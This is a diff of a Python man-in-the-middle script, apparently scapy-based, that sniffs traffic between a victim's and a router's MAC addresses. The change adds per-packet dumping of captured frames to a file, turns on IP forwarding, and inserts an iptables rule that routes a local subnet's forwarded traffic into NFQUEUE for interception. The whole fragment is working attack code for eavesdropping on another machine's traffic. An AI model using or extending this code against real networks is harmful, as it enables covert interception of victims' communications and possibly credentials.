@@ -80,13 +80,19 @@ def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
             (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == victim_mac_addr) 
         )
 
+    def process_pkt(pkt):
+        with open('file.txt', 'a') as file:
+            file.write(pkt.show(dump=True))
+            file.write('\n----\n')
 
-    pkts = sniff(lfilter = filterPkt, iface = "enp0s3")
-    f = open('file.txt', "w")
-    f.write(str(pkts))
+    sniff(prn=process_pkt, lfilter = filterPkt, iface = "enp0s3")
+    
+
 
 def main():
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    os.system('iptables -I FORWARD -d 192.168.0.198/24 -j NFQUEUE --queue-num 1')
+
     ether = Ether()
     attacker_mac_addr = ether.src
 
